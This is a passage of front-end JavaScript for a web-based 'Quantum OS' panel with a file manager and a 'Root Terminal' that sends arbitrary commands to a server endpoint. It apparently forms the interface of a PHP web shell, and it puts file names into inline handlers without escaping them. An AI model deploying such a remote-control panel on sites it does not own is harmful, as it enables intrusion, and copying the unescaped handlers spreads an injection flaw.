                <button class="os-btn confirm" id="os-d-confirm">Confirm</button>
            </div>
        </div>
    </div>

    <script>
        let zIndexCounter = 100;
        let currentPath = '';
        let ctxMenu = null;

        function b64EncodeUnicode(str) {
            return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
                return String.fromCharCode('0x' + p1);
            }));
        }

        const handleCloseCtx = (e) => { if (e && e.target && e.target.closest('.context-menu')) return; closeCtxMenu(); };
        function closeCtxMenu() { if (ctxMenu) { ctxMenu.remove(); ctxMenu = null; } }
        document.addEventListener('click', handleCloseCtx);
        document.addEventListener('touchstart', handleCloseCtx, {passive: true});

        const svgEdit = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>';
        const svgRename = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><path d="M12 20h9"></path><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path></svg>';
        const svgChmod = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>';
        const svgDelete = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>';
        const svgNewFolder = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path><line x1="12" y1="11" x2="12" y2="17"></line><line x1="9" y1="14" x2="15" y2="14"></line></svg>';
        const svgNewFile = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="12" y1="18" x2="12" y2="12"></line><line x1="9" y1="15" x2="15" y2="15"></line></svg>';
        const svgMore = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="5" r="1.5"></circle><circle cx="12" cy="12" r="1.5"></circle><circle cx="12" cy="19" r="1.5"></circle></svg>';

        const leftPaths = ["M8 20H19.5C22.5376 20 25 17.5376 25 14.5V12C25 10.3431 23.6569 9 22 9C20.3431 9 19 10.3431 19 12V14M19 14C19 17.3137 16.3137 20 13 20C9.68629 20 7 17.3137 7 14C7 10.6863 9.68629 9 13 9C16.3137 9 19 10.6863 19 14ZM17.5 4.5L21 9M22.5 3.5L23 9","M4 20H15.5C18.5376 20 21 17.5376 21 14.5V12.9737C21 12.3288 20.9423 11.6602 20.5945 11.1171C20.0688 10.2963 19.2755 10 18 10C16.3431 10 15 10.3431 15 12V14M15 14C15 17.3137 12.3137 20 9 20C5.68629 20 2.5 17.3137 2.5 14C2.5 10.6863 5.68629 9 9 9C12.3137 9 15 10.6863 15 14ZM12.5 6L17 10M16.5 4.5L19 10","M4 20H15.5C18.5376 20 21 17.5376 21 14.5V12C21 10.3431 19.6569 9 18 9C16.3431 9 15 10.3431 15 12V14M15 14C15 17.3137 12.3137 20 9 20C5.68629 20 3 17.3137 3 14C3 10.6863 5.68629 9 9 9C12.3137 9 15 10.6863 15 14ZM17 3.5V9M21 4L19 9","M3 20H15.5C18.5376 20 21 17.5376 21 14.5V12C21 10.3431 19.6569 9 18 9C16.3431 9 15 10.3431 15 12V14M15 14C15 17.3137 12.3137 20 9 20C5.68629 20 3 17.3137 3 14C3 10.6863 5.68629 8 9 8C12.3137 8 15 10.6863 15 14ZM15.5 4.5L17 9M20.5 4.5L19 9"];
        const rightPaths = ["M21.1618 12.0725C21.0324 12.2462 20.8964 12.4091 20.6947 12.4906C19.8889 12.8161 17.72 12.7592 18.1576 14.4568C20.4274 15.7829 18.7648 19.057 17.312 19.6509C14.5299 20.7884 15.2668 16.2734 12.558 16.6605C10.2266 16.9937 8.25785 22.0029 5.92645 21.1221C3.11203 20.0589 7.03795 16.2052 3.80815 15.0326C0.15683 13.9675 2.89493 9.94939 5.98043 12.2436C6.17283 12.0692 7.37001 10.5381 9.67966 9.76257C12.072 8.95926 13.6526 9.29784 13.6509 9.28399C13.0759 8.07151 10.3146 6.76186 10.2522 5.06943C10.2291 4.44247 10.8734 4.06837 11.4987 4.01715C14.1054 3.80361 16.496 4.09566 17.1154 5.96899C19.9542 5.62044 23.1405 9.41662 21.1618 12.0725Z","M21.1777 11.3703C21.0607 11.5526 20.9365 11.7246 20.7409 11.8199C19.9598 12.2008 18.4008 11.9811 18.9557 13.644C21.3124 14.8086 23.9451 17.671 22.5373 18.3648C19.8413 19.6936 15.5901 15.9721 12.9149 16.5473C10.6125 17.0423 5.90925 21.4348 3.52209 20.7189C0.640352 19.8546 7.37655 16.4781 4.07283 15.5336C0.356106 14.7259 2.80724 10.5266 6.04526 12.5999C6.22503 12.4125 7.31249 10.8017 9.56242 9.86692C11.8929 8.89869 13.4933 9.12618 13.4906 9.11248C12.8306 7.93976 9.18504 6.60733 8.78419 4.85079C8.6446 4.23913 9.26919 3.80341 9.89169 3.72521C12.6765 3.3754 15.9636 3.73045 16.7155 5.56389C19.523 5.01816 22.9663 8.58284 21.1777 11.3703Z","M20.9725 13.8838C20.8098 14.0268 20.6429 14.1579 20.4287 14.1956C19.5728 14.3464 18.1348 13.7055 18.2098 15.4569C20.1543 17.226 21.8959 20.7032 20.3515 20.9821C17.3937 21.5163 14.3329 16.7672 11.6028 16.5827C9.25311 16.4239 5.7761 19.0402 3.67875 17.694C1.14688 16.0689 7.28575 15.146 4.37033 13.3275C1.02023 11.5266 4.53391 8.16558 7.07499 11.0512C7.29946 10.9205 7.80111 9.51543 10.2215 9.23703C12.7286 8.94867 14.2043 9.60848 14.2055 9.59458C13.8943 8.28534 10.7572 5.99969 10.8561 4.20071C10.8905 3.57426 11.611 3.32758 12.2309 3.424C15.0043 3.85533 18.0662 5.10268 18.2836 7.07233C21.1327 7.3216 23.4601 11.6973 20.9725 13.8838Z","M21.115 13.1921C20.9654 13.3487 20.8106 13.4938 20.6005 13.5501C19.761 13.7749 17.6152 13.4542 17.8427 15.1924C19.9339 16.7853 20.8847 19.8323 19.3704 20.2448C16.4704 21.0348 14.7521 16.6432 12.0163 16.6973C9.66163 16.7439 7.09707 21.4758 4.89038 20.3175C2.22651 18.9192 6.59282 15.5726 3.53001 14.0151C0.0356922 12.5131 3.24307 8.85857 6.02598 11.5117C6.2382 11.362 7.61304 9.98829 10 9.5C12.4724 8.99423 14 9.52291 14 9.50896C13.5713 8.2183 11.6644 5.81661 12.0937 3.89732C12.2306 3.28506 12.8811 2.98279 13.504 3.05766C15.922 3.34828 17.4579 4.71479 17.8427 6.64088C20.7027 6.64088 23.4026 10.7971 21.115 13.1921Z"];

        function initPathSliderLogic() {
            const slider = document.getElementById('path-slider'); const fsView = document.getElementById('fs-view'); 
            if (!slider || !fsView || typeof gsap === 'undefined') return;
            const inner = slider.querySelector('.slider-inner'); const input = inner.querySelector('input');
            const leftIcon = slider.querySelector('svg:first-child path'); const rightIcon = slider.querySelector('svg:last-child path');
            const min = Number(input.min) || 0; const thumbSize = 20; 
            const label = document.createElement('div'); label.classList.add('slider-label'); const labelInner = document.createElement('div');
            
            const getPosition = (value, maxVal) => { const sliderWidth = input.offsetWidth; return (maxVal > 0 ? (value - min) / (maxVal - min) : 0) * (sliderWidth - thumbSize) + thumbSize / 2 - label.offsetWidth / 2; };
            let startValue = 0; const threshold = 6; let isDraggingLeft = false; let isDraggingRight = false; let lastDirection = 'right'; let lastSliderValue = input.value; let lastX = 0; let isSyncing = false; 

            const animateLeft = gsap.to(leftIcon, { keyframes: leftPaths.map(morphSVG => ({ morphSVG })), duration: .8, repeat: -1, paused: true, onUpdate: () => { if (!isDraggingLeft || isDraggingRight) animateLeft.repeat(0); }, onComplete: () => { if (!isDraggingLeft) animateLeft.pause(); } });
            const animateRight = gsap.to(rightIcon, { keyframes: rightPaths.map(morphSVG => ({ morphSVG })), duration: 1, repeat: -1, paused: true, onUpdate: () => { if (!isDraggingRight || isDraggingLeft) animateRight.repeat(0); }, onComplete: () => { if (!isDraggingRight) animateRight.pause(); } });

            const animateIcon = (direction, sliderValue, maxVal) => {
                isDraggingLeft = direction === 'left'; isDraggingRight = direction === 'right';
                const scale = maxVal > 0 ? (sliderValue - min) / (maxVal - min) : 0; const finalScale = .5 + scale * 1.5;
                if (direction === 'left') { if (animateLeft.paused() || lastDirection !== 'left') animateLeft.repeat(-1).play().restart(); animateLeft.timeScale(finalScale * .75); }
                if (direction === 'right') { if (animateRight.paused() || lastDirection !== 'right') animateRight.repeat(-1).play().restart(); animateRight.timeScale(finalScale * 1.5); }
                lastDirection = direction;
            };

            const updateLabel = (forceAnimation = false) => {
                const maxVal = Number(input.max) || 1; const percentInt = maxVal > 0 ? Math.round((input.value / maxVal) * 100) : 0;
                labelInner.textContent = percentInt + '%';
                const labelPosition = getPosition(Number(input.value), maxVal);
                slider.style.setProperty('--slider-percentage', `${100 - (maxVal > 0 ? (input.value / maxVal) * 100 : 0)}%`);
                gsap.to(label, { x: labelPosition, duration: 0.15, ease: 'none' });
                if (forceAnimation || Math.abs(labelPosition - lastX) > 1) { gsap.to(label, { rotation: Math.round((labelPosition - lastX) / 10) * -8, duration: 0.25, ease: 'none' }); }
                lastX = labelPosition; const sliderValue = Number(input.value); const direction = sliderValue > lastSliderValue ? 'right' : 'left'; lastSliderValue = sliderValue;
                if (Math.abs(sliderValue - startValue) >= threshold || forceAnimation) { animateIcon(direction, sliderValue, maxVal); startValue = sliderValue; }
            };

            input.addEventListener('input', () => { if(!isSyncing) { isSyncing = true; fsView.scrollTop = input.value; updateLabel(true); setTimeout(() => isSyncing = false, 10); } });
            fsView.addEventListener('scroll', () => { if(!isSyncing) { isSyncing = true; input.value = fsView.scrollTop; updateLabel(true); setTimeout(() => isSyncing = false, 10); } });
            input.addEventListener('change', () => { isDraggingLeft = false; isDraggingRight = false; gsap.to(label, { rotation: 0, duration: 0.25, ease: 'none' }); });
            
            const showDrag = () => { startValue = Number(input.value); slider.classList.add('isDragging'); };
            const hideDrag = () => slider.classList.remove('isDragging');
            input.addEventListener('pointerdown', showDrag); input.addEventListener('pointerup', hideDrag); input.addEventListener('pointerleave', hideDrag);
            fsView.addEventListener('touchstart', showDrag, {passive: true}); fsView.addEventListener('touchend', hideDrag);
            label.appendChild(labelInner); inner.appendChild(label); updateLabel();
            window.addEventListener('resize', () => { updateLabel(false); });
        }

        function showToast(msg, type = 'success') {
            const container = document.getElementById('toast-container'); const t = document.createElement('div'); t.className = 'sys-toast ' + type;
            const iconSvg = type === 'success' ? `<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>` : `<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>`;
            t.innerHTML = `${iconSvg} <span>${msg}</span>`; container.appendChild(t);
            setTimeout(() => { t.style.opacity = '0'; t.style.transform = 'translateY(-10px)'; t.style.transition = '0.3s'; setTimeout(() => t.remove(), 300); }, 3000);
        }

        function createWindow(id, title, contentHTML, width = 600, height = 450, extraClass = '') {
            const desk = document.getElementById('desktop'); if (document.getElementById(id)) { focusWindow(document.getElementById(id)); return; }
            const win = document.createElement('div'); win.className = 'window ' + extraClass; win.id = id; win.style.width = width + 'px'; win.style.height = height + 'px';
            win.style.top = (20 + Math.random() * 40) + 'px'; win.style.left = (20 + Math.random() * 40) + 'px'; win.style.zIndex = ++zIndexCounter;
            win.innerHTML = `<div class="win-titlebar"><div class="win-title">${title}</div><div class="win-controls">
                <button class="win-home-btn" onclick="cardAction('home')" title="Home"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg></button>
                <button class="win-hamburger-btn" id="win-hb-btn" onclick="toggleCardMenu(this)" title="Menu"><span class="hb-line"></span><span class="hb-line"></span><span class="hb-line"></span></button>
                <button class="win-btn w-max" onclick="this.closest('.window').style.width='100%'; this.closest('.window').style.height='100%'; this.closest('.window').style.top='0'; this.closest('.window').style.left='0';"></button>
                <button class="win-btn w-close" onclick="this.closest('.window').remove()"></button>
            </div></div><div class="win-content">${contentHTML}</div>`;
            win.addEventListener('mousedown', () => focusWindow(win));
            makeDraggable(win, win.querySelector('.win-titlebar')); desk.appendChild(win); return win;
        }

        function focusWindow(win) { win.style.zIndex = ++zIndexCounter; }

        function makeDraggable(win, handle) {
            let isDrag = false, sx, sy, ix, iy;
            const start = (e) => { isDrag = true; ix = win.offsetLeft; iy = win.offsetTop; sx = e.clientX || e.touches[0].clientX; sy = e.clientY || e.touches[0].clientY; };
            const move = (e) => { if(isDrag) { win.style.left = (ix + (e.clientX || e.touches[0].clientX) - sx) + 'px'; win.style.top = (iy + (e.clientY || e.touches[0].clientY) - sy) + 'px'; }};
            handle.addEventListener('mousedown', start); document.addEventListener('mousemove', move); document.addEventListener('mouseup', () => isDrag=false);
            handle.addEventListener('touchstart', start, {passive:true}); document.addEventListener('touchmove', move, {passive:true}); document.addEventListener('touchend', () => isDrag=false);
        }

        function launchApp(app) {
            if (app === 'explorer') {
                createWindow('win-exp', '<span class="glitch-title" data-text="FILEMANAGER">FILEMANAGER</span>', `
                    <div class="explorer-header" id="exp-header">
                        <div class="breadcrumb-bar" id="breadcrumb-bar"></div>
                        <div class="slider" id="path-slider" style="display: grid;">
                            <svg viewBox="0 0 24 24"><path d="M3 20H15.5C18.5376 20 21 17.5376 21 14.5V12C21 10.3431 19.6569 9 18 9C16.3431 9 15 10.3431 15 12V14M15 14C15 17.3137 12.3137 20 9 20C5.68629 20 3 17.3137 3 14C3 10.6863 5.68629 8 9 8C12.3137 8 15 10.6863 15 14ZM15.5 4.5L17 9M20.5 4.5L19 9"/></svg>
                            <div class="slider-inner"><input type="range" min="0" max="100" value="0" id="path-slider-input" /></div>
                            <svg viewBox="0 0 24 24"><path d="M21.115 13.1921C20.9654 13.3487 20.8106 13.4938 20.6005 13.5501C19.761 13.7749 17.6152 13.4542 17.8427 15.1924C19.9339 16.7853 20.8847 19.8323 19.3704 20.2448C16.4704 21.0348 14.7521 16.6432 12.0163 16.6973C9.66163 16.7439 7.09707 21.4758 4.89038 20.3175C2.22651 18.9192 6.59282 15.5726 3.53001 14.0151C0.0356922 12.5131 3.24307 8.85857 6.02598 11.5117C6.2382 11.362 7.61304 9.98829 10 9.5C12.4724 8.99423 14 9.52291 14 9.50896C13.5713 8.2183 11.6644 5.81661 12.0937 3.89732C12.2306 3.28506 12.8811 2.98279 13.504 3.05766C15.922 3.34828 17.4579 4.71479 17.8427 6.64088C20.7027 6.64088 23.4026 10.7971 21.115 13.1921Z"/></svg>
                        </div>
                    </div><div id="fs-view"></div>`, 650, 500);
                initPathSliderLogic(); fetchFileSystem('');
            } else if (app === 'terminal') {
                createWindow('win-term', 'Root Terminal', `<div class="terminal-output" id="term-out">Quantum OS Kernel [Version 1.0.0]\nAuthenticated as root.\n\n</div><div class="terminal-input-line"><span>root@quantum:~#</span><input type="text" class="terminal-input" id="term-in" autocomplete="off" spellcheck="false"></div>`, 500, 350, 'float-term');
                const termIn = document.getElementById('term-in'); termIn.focus();
                termIn.addEventListener('keypress', e => { if (e.key === 'Enter' && termIn.value) { apiCmd(termIn.value); termIn.value = ''; } });
            }
        }

        function getSvg(type, ext = '') {
            if (type === 'dir') return '<svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>';
            if (['php', 'js', 'html', 'css', 'json', 'py', 'sh', 'sql', 'xml'].includes(ext)) { return '<svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>'; }
            if (['jpg', 'jpeg', 'png', 'gif', 'svg', 'webp', 'ico'].includes(ext)) { return '<svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>'; }
            if (['zip', 'rar', 'tar', 'gz', '7z'].includes(ext)) { return '<svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg>'; }
            if (['mp4', 'mp3', 'wav', 'mkv', 'avi'].includes(ext)) { return '<svg viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>'; }
            return '<svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>';
        }

        function renderBreadcrumbs(path) {
            const bar = document.getElementById('breadcrumb-bar'); if(!bar) return; bar.innerHTML = '';
            const isWin = path.indexOf('\\') !== -1 || /^[a-zA-Z]:/.test(path); const parts = path.split(/[/\\]/).filter(Boolean);
            const rootCrumb = document.createElement('span'); rootCrumb.className = 'crumb'; rootCrumb.innerHTML = '<svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>';
            rootCrumb.onclick = () => fetchFileSystem(isWin ? (parts[0] ? parts[0]+'\\' : '') : '/'); bar.appendChild(rootCrumb);
            let currentPathBuild = '';
            parts.forEach((part, idx) => {
                const sep = document.createElement('span'); sep.className = 'crumb-sep'; sep.innerText = '/'; bar.appendChild(sep);
                if (isWin) currentPathBuild += (idx === 0 ? part : '\\' + part); else currentPathBuild += '/' + part;
                let passPath = currentPathBuild; if (isWin && idx === 0) passPath += '\\';
                const crumb = document.createElement('span'); crumb.className = 'crumb'; crumb.innerText = part;
                crumb.onclick = () => fetchFileSystem(passPath); bar.appendChild(crumb);
            });
        }

        function showActionMenu(e, filename, type) {
            closeCtxMenu();
            ctxMenu = document.createElement('div'); ctxMenu.className = 'context-menu'; ctxMenu.style.visibility = 'hidden'; 
            const rect = e.currentTarget.getBoundingClientRect();
            
            let menuHtml = '';
            if (type === 'dir') {
                menuHtml = `
                    <div class="ctx-item" onclick="closeCtxMenu(); apiPrompt('Rename', '${filename}', (v) => apiRename('${filename}', v))">${svgRename} Rename</div>
                    <div class="ctx-item danger" onclick="closeCtxMenu(); if(confirm('Delete ${filename}?')) apiDelete('${filename}')">${svgDelete} Delete</div>`;
            } else {
                menuHtml = `
                    <div class="ctx-item" onclick="closeCtxMenu(); apiReadAndEdit('${filename}')">${svgEdit} Edit File</div>
                    <div class="ctx-item" onclick="closeCtxMenu(); apiPrompt('Rename', '${filename}', (v) => apiRename('${filename}', v))">${svgRename} Rename</div>
                    <div class="ctx-item" onclick="closeCtxMenu(); apiPrompt('Chmod', '0755', (v) => apiChmod('${filename}', v))">${svgChmod} Chmod</div>
                    <div class="ctx-item danger" onclick="closeCtxMenu(); if(confirm('Delete ${filename}?')) apiDelete('${filename}')">${svgDelete} Delete</div>`;
            }
            
            ctxMenu.innerHTML = menuHtml;
            document.body.appendChild(ctxMenu);
            
            const menuRect = ctxMenu.getBoundingClientRect();
            let leftPos = rect.right - menuRect.width;
            let topPos = rect.bottom + 5;
            
            if (topPos + menuRect.height > window.innerHeight) {
                topPos = rect.top - menuRect.height - 5;
            }
            if (leftPos < 10) leftPos = 10;
            
            ctxMenu.style.left = leftPos + 'px'; 
            ctxMenu.style.top = topPos + 'px'; 
            ctxMenu.style.visibility = 'visible';
        }

        async function fetchFileSystem(pathTarget) {
            const fsView = document.getElementById('fs-view'); const expHeader = document.getElementById('exp-header');
            if (!fsView) return; if (expHeader) expHeader.style.display = 'none';
            fsView.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;width:100%;height:100%;"><div class="dl-loader"><svg preserveAspectRatio="xMidYMid meet" viewBox="0 0 581 158"><g id="fire"><rect id="mask-fire-black" x="511" y="41" width="38" height="34"></rect><g><defs><rect id="mask_fire" x="511" y="41" width="38" height="34"></rect></defs><clipPath id="mask-fire_1_"><use xlink:href="#mask_fire" overflow="visible"></use></clipPath><g id="group-fire" clip-path="url(#mask-fire_1_)"><path id="red-flame" fill="#BE002A" d="M528.377,100.291c6.207,0,10.947-3.272,10.834-8.576 c-0.112-5.305-2.934-8.803-8.237-10.383c-5.306-1.581-3.838-7.9-0.79-9.707c-7.337,2.032-7.581,5.891-7.11,8.238 c0.789,3.951,7.56,4.402,5.077,9.48c-2.482,5.079-8.012,1.129-6.319-2.257c-2.843,2.233-4.78,6.681-2.259,9.703 C521.256,98.809,524.175,100.291,528.377,100.291z"></path><path id="yellow-flame" opacity="0.71" fill="var(--accent)" d="M528.837,100.291c4.197,0,5.108-1.854,5.974-5.417 c0.902-3.724-1.129-6.207-5.305-9.931c-2.396-2.137-1.581-4.176-0.565-6.32c-4.401,1.918-3.384,5.304-2.482,6.658 c1.511,2.267,2.099,2.364,0.42,5.8c-1.679,3.435-5.42,0.764-4.275-1.527c-1.921,1.512-2.373,4.04-1.528,6.563 C522.057,99.051,525.994,100.291,528.837,100.291z"></path><path id="white-flame" opacity="0.81" fill="#FFFFFF" d="M529.461,100.291c-2.364,0-4.174-1.322-4.129-3.469 c0.04-2.145,1.117-3.56,3.141-4.198c2.022-0.638,1.463-3.195,0.302-3.925c2.798,0.821,2.89,2.382,2.711,3.332 c-0.301,1.597-2.883,1.779-1.938,3.834c0.912,1.975,3.286,0.938,2.409-0.913c1.086,0.903,1.826,2.701,0.864,3.924 C532.18,99.691,531.064,100.291,529.461,100.291z"></path></g></g></g><g id="progress-trail"><path fill="#FFFFFF" d="M491.979,83.878c1.215-0.73-0.62-5.404-3.229-11.044c-2.583-5.584-5.034-10.066-7.229-8.878 c-2.854,1.544-0.192,6.286,2.979,11.628C487.667,80.917,490.667,84.667,491.979,83.878z"></path><path fill="#FFFFFF" d="M571,76v-5h-23.608c0.476-9.951-4.642-13.25-4.642-13.25l-3.125,4c0,0,3.726,2.7,3.625,5.125 c-0.071,1.714-2.711,3.18-4.962,4.125H517v5h10v24h-25v-5.666c0,0,0.839,0,2.839-0.667s6.172-3.667,4.005-6.333 s-7.49,0.333-9.656,0.166s-6.479-1.5-8.146,1.917c-1.551,3.178,0.791,5.25,5.541,6.083l-0.065,4.5H16c-2.761,0-5,2.238-5,5v17 c0,2.762,2.239,5,5,5h549c2.762,0,5-2.238,5-5v-17c0-2.762-2.238-5-5-5h-3V76H571z"></path><path fill="#FFFFFF" d="M535,65.625c1.125,0.625,2.25-1.125,2.25-1.125l11.625-22.375c0,0,0.75-0.875-1.75-2.125 s-3.375,0.25-3.375,0.25s-8.75,21.625-9.875,23.5S533.875,65,535,65.625z"></path></g><g><defs><path id="SVGID_1_" d="M484.5,75.584c-3.172-5.342-5.833-10.084-2.979-11.628c2.195-1.188,4.646,3.294,7.229,8.878 c2.609,5.64,4.444,10.313,3.229,11.044C490.667,84.667,487.667,80.917,484.5,75.584z M571,76v-5h-23.608 c0.476-9.951-4.642-13.25-4.642-13.25l-3.125,4c0,0,3.726,2.7,3.625,5.125c-0.071,1.714-2.711,3.18-4.962,4.125H517v5h10v24h-25 v-5.666c0,0,0.839,0,2.839-0.667s6.172-3.667,4.005-6.333s-7.49,0.333-9.656,0.166s-6.479-1.5-8.146,1.917 c-1.551,3.178,0.791,5.25,5.541,6.083l-0.065,4.5H16c-2.761,0-5,2.238-5,5v17c0,2.762,2.239,5,5,5h549c2.762,0,5-2.238,5-5v-17 c0-2.762-2.238-5-5-5h-3V76H571z M535,65.625c1.125,0.625,2.25-1.125,2.25-1.125l11.625-22.375c0,0,0.75-0.875-1.75-2.125 s-3.375,0.25-3.375,0.25s-8.75,21.625-9.875,23.5S533.875,65,535,65.625z"></path></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" overflow="visible"></use></clipPath><rect id="progress-time-fill" x="-100%" y="34" clip-path="url(#SVGID_2_)" fill="#BE002A" width="586" height="103"></rect></g><g id="death-group"><path id="death" fill="#BE002A" d="M-46.25,40.416c-5.42-0.281-8.349,3.17-13.25,3.918c-5.716,0.871-10.583-0.918-10.583-0.918 C-67.5,49-65.175,50.6-62.083,52c5.333,2.416,4.083,3.5,2.084,4.5c-16.5,4.833-15.417,27.917-15.417,27.917L-75.5,84.75 c-1,12.25-20.25,18.75-20.25,18.75s39.447,13.471,46.25-4.25c3.583-9.333-1.553-16.869-1.667-22.75 c-0.076-3.871,2.842-8.529,6.084-12.334c3.596-4.22,6.958-10.374,6.958-15.416C-38.125,43.186-39.833,40.75-46.25,40.416z M-40,51.959c-0.882,3.004-2.779,6.906-4.154,6.537s-0.939-4.32,0.112-7.704c0.82-2.64,2.672-5.96,3.959-5.583 C-39.005,45.523-39.073,48.8-40,51.959z"></path><path id="death-arm" fill="#BE002A" d="M-53.375,75.25c0,0,9.375,2.25,11.25,0.25s2.313-2.342,3.375-2.791 c1.083-0.459,4.375-1.75,4.292-4.75c-0.101-3.627,0.271-4.594,1.333-5.043c1.083-0.457,2.75-1.666,2.75-1.666 s0.708-0.291,0.5-0.875s-0.791-2.125-1.583-2.959c-0.792-0.832-2.375-1.874-2.917-1.332c-0.542,0.541-7.875,7.166-7.875,7.166 s-2.667,2.791-3.417,0.125S-49.833,61-49.833,61s-3.417,1.416-3.417,1.541s-1.25,5.834-1.25,5.834l-0.583,5.833L-53.375,75.25z"></path><path id="death-tool" fill="#BE002A" d="M-20.996,26.839l-42.819,91.475l1.812,0.848l38.342-81.909c0,0,8.833,2.643,12.412,7.414 c5,6.668,4.75,14.084,4.75,14.084s4.354-7.732,0.083-17.666C-10,32.75-19.647,28.676-19.647,28.676l0.463-0.988L-20.996,26.839z"></path></g><path id="designer-body" fill="#ffffff" d="M514.75,100.334c0,0,1.25-16.834-6.75-16.5c-5.501,0.229-5.583,3-10.833,1.666 c-3.251-0.826-5.084-15.75-0.834-22c4.948-7.277,12.086-9.266,13.334-7.833c2.25,2.583-2,10.833-4.5,14.167 c-2.5,3.333-1.833,10.416,0.5,9.916s8.026-0.141,10,2.25c3.166,3.834,4.916,17.667,4.916,17.667l0.917,2.5l-4,0.167L514.75,100.334z"></path><circle id="designer-head" fill="#ffffff" cx="516.083" cy="53.25" r="6.083"></circle><g id="designer-arm-grop"><path id="designer-arm" fill="#ffffff" d="M505.875,64.875c0,0,5.875,7.5,13.042,6.791c6.419-0.635,11.833-2.791,13.458-4.041s2-3.5,0.25-3.875 s-11.375,5.125-16,3.25c-5.963-2.418-8.25-7.625-8.25-7.625l-2,1.125L505.875,64.875z"></path><path id="designer-pen" fill="#ffffff" d="M525.75,59.084c0,0-0.423-0.262-0.969,0.088c-0.586,0.375-0.547,0.891-0.547,0.891l7.172,8.984l1.261,0.453 l-0.104-1.328L525.75,59.084z"></path></g></svg><div class="dl-text"><div class="dl-mask-red"><div class="inner">FETCHING...</div></div><div class="dl-mask-white"><div class="inner">FETCHING...</div></div></div></div></div>`;
            
            try {
                const res = await fetch(`?api=1&action=list&path=${encodeURIComponent(currentPathBuildTarget(pathTarget))}`);
                const json = await res.json();
                if (expHeader) expHeader.style.display = 'flex';

                if (json.status === 'ok') {
                    currentPath = json.data.path; renderBreadcrumbs(currentPath); fsView.innerHTML = '';
                    json.data.items.forEach(item => {
                        const row = document.createElement('div'); row.className = `list-row ${item.type}`;
                        const permColor = item.permit ? 'var(--success)' : 'var(--danger)'; 
                        let metaHtml = ''; let actionsHtml = '';

                        const jsName = item.name.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '&quot;').replace(/\n/g, '\\n').replace(/\r/g, '\\r');
                        const htmlName = item.name.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

                        if (item.name === '..') {
                            metaHtml = `<div class="f-meta">Go up to parent directory</div>`;
                            actionsHtml = `<div class="row-actions"><button class="act-btn" onclick="event.stopPropagation(); apiPrompt('New Folder', 'folder_name', apiMkdir)" title="New Folder">${svgNewFolder}</button><button class="act-btn" onclick="event.stopPropagation(); apiPrompt('New File', 'filename.txt', apiTouch)" title="New File">${svgNewFile}</button></div>`;
                        } else {
